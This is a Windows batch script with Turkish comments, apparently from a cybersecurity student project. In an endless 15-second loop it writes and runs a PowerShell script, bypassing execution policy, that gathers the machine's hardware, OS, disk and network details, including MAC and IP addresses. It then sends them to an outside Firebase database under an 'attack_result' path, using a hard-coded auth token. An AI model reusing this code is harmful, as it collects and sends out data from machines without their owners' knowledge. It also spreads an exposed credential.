@echo off
setlocal EnableDelayedExpansion

:: Kullanıcı adını alalım
set username=%USERNAME%
echo Kullanıcı adı: %username%

:: Sürekli döngü
:loop
echo Sistem bilgileri toplanıyor...

:: Zaman damgasını doğru formatta alalım
set timestamp=
for /f "delims=" %%a in ('powershell -Command "Get-Date -Format 'yyyy-MM-dd_HH-mm-ss'"') do @set timestamp=%%a

:: Powershell komutlarını dosyaya yazalım
echo try { > powershell_commands.ps1
echo     $sysInfo = Get-WmiObject -Class Win32_ComputerSystem ^| Select-Object Manufacturer,Model,TotalPhysicalMemory,NumberOfProcessors; >> powershell_commands.ps1
echo     $osInfo = Get-WmiObject -Class Win32_OperatingSystem ^| Select-Object Caption,Version; >> powershell_commands.ps1
echo     $networkInfo = Get-WmiObject -Class Win32_NetworkAdapterConfiguration ^| Where-Object { $_.IPEnabled -eq $true } ^| Select-Object Description,MACAddress,IPAddress; >> powershell_commands.ps1
echo     $diskInfo = Get-WmiObject -Class Win32_DiskDrive ^| Select-Object Model,Size; >> powershell_commands.ps1
echo     $url = 'https://cybersecurityfinalproject-default-rtdb.firebaseio.com/client/%username%/attack/attack_result/%timestamp%.json?auth=9Q6otjqjipf5Sczouqxxqn507B9eau2V8btKxKpJ'; >> powershell_commands.ps1
echo     $body = @{ >> powershell_commands.ps1
echo         system_info = @{ >> powershell_commands.ps1
echo             Manufacturer = $sysInfo.Manufacturer; >> powershell_commands.ps1
echo             Model = $sysInfo.Model; >> powershell_commands.ps1
echo             TotalPhysicalMemory = $sysInfo.TotalPhysicalMemory; >> powershell_commands.ps1
echo             NumberOfProcessors = $sysInfo.NumberOfProcessors; >> powershell_commands.ps1
echo         }; >> powershell_commands.ps1
echo         os_info = @{ >> powershell_commands.ps1
echo             Caption = $osInfo.Caption; >> powershell_commands.ps1
echo             Version = $osInfo.Version; >> powershell_commands.ps1
echo         }; >> powershell_commands.ps1
echo         network_info = $networkInfo ^| ForEach-Object { >> powershell_commands.ps1
echo             @{ >> powershell_commands.ps1
echo                 Description = $_.Description; >> powershell_commands.ps1
echo                 MACAddress = $_.MACAddress; >> powershell_commands.ps1
echo                 IPAddress = $_.IPAddress -join ', '; >> powershell_commands.ps1
echo             } >> powershell_commands.ps1
echo         }; >> powershell_commands.ps1
echo         disk_info = $diskInfo ^| ForEach-Object { >> powershell_commands.ps1
echo             @{ >> powershell_commands.ps1
echo                 Model = $_.Model; >> powershell_commands.ps1
echo                 Size = $_.Size; >> powershell_commands.ps1
echo             } >> powershell_commands.ps1
echo         }; >> powershell_commands.ps1
echo         Timestamp = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') >> powershell_commands.ps1
echo     } ^| ConvertTo-Json; >> powershell_commands.ps1
echo     Write-Host 'URL: ' $url; >> powershell_commands.ps1
echo     Write-Host 'Gönderilen Veri: ' $body; >> powershell_commands.ps1
echo     Invoke-RestMethod -Uri $url -Method PUT -ContentType 'application/json' -Body $body >> powershell_commands.ps1
echo } catch { >> powershell_commands.ps1
echo     Write-Host 'Bir hata oluştu: ' $_.Exception.Message >> powershell_commands.ps1
echo     exit 1 >> powershell_commands.ps1
echo } >> powershell_commands.ps1

:: Powershell komutlarını çalıştır ve çıktıyı dosyaya kaydet
powershell -ExecutionPolicy Bypass -File powershell_commands.ps1 > output.log 2>&1

:: Çıkışı ve hataları göster
type output.log

echo 15 saniye bekleniyor...
:: 15 saniye bekleme
timeout /t 15 /nobreak >nul

:: Döngüyü tekrar başlat
goto loop

:end
pause
